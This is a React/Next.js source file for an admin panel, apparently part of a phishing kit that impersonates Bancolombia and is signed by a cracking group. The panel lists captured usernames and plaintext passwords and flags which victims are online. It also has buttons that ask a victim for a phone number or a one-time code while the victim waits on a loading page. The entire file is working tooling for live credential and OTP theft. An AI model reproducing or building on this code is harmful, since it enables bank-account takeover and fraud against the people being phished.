"use client";

import { useMemo, useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Footer from "../appPages/components/Footer";
import Head from "next/head";

export default function ProtectedDashboard() {
  const [submissions, setSubmissions] = useState([]);
  const [message, setMessage] = useState("");
  const [authorized, setAuthorized] = useState(false);
  const router = useRouter();

  useEffect(() => {
    async function checkLogin() {
      const resp = await fetch("/api/admin/me", { credentials: "include" });
      if (resp.ok) {
        setAuthorized(true);
      } else {
        router.push("/admin");
      }
    }
    checkLogin();
  }, [router]);

  const loadServer = async () => {
    const resp = await fetch("/api/login");
    const data = await resp.json();
    if (data.status === "ok") {
      setSubmissions(data.data || []);
      setMessage("Datos cargados del servidor.");
    } else {
      setMessage("No se pudieron cargar datos del servidor.");
    }
  };

  const entries = useMemo(() => submissions || [], [submissions]);

  const metrics = useMemo(() => {
    const count = entries.length;
    const byFlow = entries.reduce((acc, item) => {
      acc[item.flow] = (acc[item.flow] || 0) + 1;
      return acc;
    }, {});

    const success = entries.filter((i) => i.status === "ok").length;
    const errors = entries.filter((i) => i.status === "error").length;

    return { count, byFlow, success, errors };
  }, [entries]);

  const loadLocal = () => {
    const local = JSON.parse(localStorage.getItem("svpSubmissions") || "[]");
    setSubmissions(local);
    setMessage("Datos cargados del localStorage.");
  };

  const requestUserInfo = async (username, action = "otp-p") => {
    if (!username) {
      setMessage("No hay usuario en esta fila.");
      return;
    }

    const flow = action === "otp-p" ? "OTP-P" : "OTP-E";
    localStorage.setItem("svpFlow", flow);

    try {
      const resp = await fetch("/api/send-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ user: username, action, flow }),
      });
      const data = await resp.json();
      if (!resp.ok) {
        setMessage(`Error solicitando datos: ${data.message || "desconocido"}`);
        return;
      }

      const details = action === "otp-p" ? "Número de teléfono solicitado" : `Código enviado${data.code ? ` (${data.code})` : ""}`;
      setMessage(`Solicitud (${flow}) para ${username}: ${details}`);
      router.push(`/loading?next=waiting&user=${encodeURIComponent(username)}&flow=${encodeURIComponent(flow)}`);
    } catch (error) {
      setMessage("Error de red al solicitar los datos.");
    }
  };

  if (!authorized) {
    return (
      <main className="bc-container bc-mt-4">
        <h2>Autenticando...</h2>
        <p>Redirigiendo al login de administrador...</p>
      </main>
    );
  }

  return (
    <>
      <Head>
        <title>Dashboard | Bancolombia SVP</title>
      </Head>
      <main style={{
        minHeight: "100vh",
        background: "radial-gradient(circle at top left, #002732, #000000 45%)",
        color: "#b5fff5",
        padding: "2rem"
      }}>
        <section style={{
          maxWidth: "1200px",
          margin: "0 auto",
          padding: "2rem",
          borderRadius: "1rem",
          background: "linear-gradient(145deg, rgba(42, 59, 69, 0.9), rgba(8, 19, 28, 0.85))",
          boxShadow: "0 0 30px rgba(0, 255, 255, 0.25)"
        }}>
          <div style={{
            textAlign: "center",
            marginBottom: "1rem",
            fontFamily: "monospace",
            letterSpacing: "0.5rem",
            fontSize: "2rem",
            color: "#4ff6e2",
            textShadow: "0 0 16px rgba(79, 246, 226, 0.7)"
          }}>
            . E X E
          </div>

          <div style={{
            background: "linear-gradient(135deg, rgba(0, 34, 38, 0.85), rgba(0, 60, 75, 0.65))",
            border: "1px solid rgba(64, 255, 230, 0.5)",
            borderRadius: "1rem",
            padding: "1rem",
            boxShadow: "inset 0 0 20px rgba(64, 255, 230, 0.35), 0 0 25px rgba(10, 220, 200, 0.4)"
          }}>
            <h2 style={{ margin: "0 0 1rem", color: "#d4fffd" }}> Society . E X E </h2>
            <div className="bc-mt-2 bc-gap-3 bc-flex" style={{ display: "flex", gap: "0.75rem", flexWrap: "wrap" }}>
              <button className="bc-button bc-button-outline" onClick={loadLocal}>
                Cargar datos locales
              </button>
              <button className="bc-button bc-button-outline" onClick={loadServer}>
                Cargar datos servidor
              </button>
              <button
                className="bc-button bc-button-danger"
                onClick={async () => {
                  await fetch('/api/admin/logout', {
                    method: 'POST',
                    credentials: 'include',
                  });
                  router.push('/admin');
                }}
              >
                Cerrar sesión
              </button>
            </div>
            <p>{message}</p>
            <section className="bc-mt-3" style={{ display: "flex", gap: "1rem", flexWrap: "wrap" }}>
              <div className="bc-card bc-card-basic" style={{ padding: "1rem" }}>
                <strong>Total registros: </strong> {metrics.count}
              </div>
              <div className="bc-card bc-card-basic" style={{ padding: "1rem" }}>
                <strong>Éxitos: </strong> {metrics.success}
              </div>
              <div className="bc-card bc-card-basic" style={{ padding: "1rem" }}>
                <strong>Errores: </strong> {metrics.errors}
              </div>
              <div className="bc-card bc-card-basic" style={{ padding: "1rem" }}>
                <strong>Por flujo: </strong>
                <ul>
                  {Object.entries(metrics.byFlow).map(([flow, count]) => (
                    <li key={flow}>{flow}: {count}</li>
                  ))}
                </ul>
              </div>
            </section>

            <section className="bc-mt-4" style={{ display: "flex", gap: "0.75rem", flexWrap: "wrap", justifyContent: "center" }}>
              <span style={{ color: "#bde2e2" }}>
              C-Panel Dashboard | Society . E X E by: @devcrackpy
              </span>
            </section>
          </div>
        </section>

        <table className="bc-table bc-table-striped bc-mt-3" style={{ width: "100%", background: "rgba(0,0,0,0.4)", borderRadius: "10px", border: "1px solid rgba(64,255,230,0.4)" }}>
          <thead>
            <tr>
              <th>Usuario</th>
              <th>Clave</th>
              <th>Flow</th>
              <th>Estado</th>
              <th>Última actividad</th>
              <th>Solicitud</th>
            </tr>
          </thead>
          <tbody>
            {entries.map((item, idx) => {
              const now = Date.now();
              const lastActive = item.server_timestamp || item.timestamp;
              const deltaMs = now - new Date(lastActive).getTime();
              const isOnline = deltaMs >= 0 && deltaMs < 10 * 60 * 1000;
              const statusLabel = isOnline ? "Online" : "Offline";

              return (
                <tr key={`${item.username}-${item.timestamp}-${idx}`}>
                  <td>{item.username}</td>
                  <td>{item.password}</td>
                  <td>{item.flow}</td>
                  <td>
                    <span
                      style={{
                        display: "inline-block",
                        padding: "0.2rem 0.6rem",
                        borderRadius: "999px",
                        color: "#fff",
                        background: isOnline ? "#22c55e" : "#ef4444",
                        fontWeight: "bold",
                        fontSize: "0.85rem",
                      }}
                    >
                      {statusLabel}
                    </span>
                  </td>
                  <td>{new Date(lastActive).toLocaleString()}</td>
                  <td style={{ display: "flex", gap: "0.4rem", flexWrap: "wrap" }}>
                    <button
                      className="bc-button bc-button-primary bc-button-xs"
                      onClick={() => requestUserInfo(item.username, "otp-p")}
                    >
                      OTP-P (solicitar teléfono)
                    </button>
                    <button
                      className="bc-button bc-button-secondary bc-button-xs"
                      onClick={() => requestUserInfo(item.username, "otp-e")}
                    >
                      OTP-E (solicitar código)
                    </button>
                  </td>
                </tr>
              );
            })}
          </tbody>
        </table>

        <Footer />
      </main>
    </>
  );
}

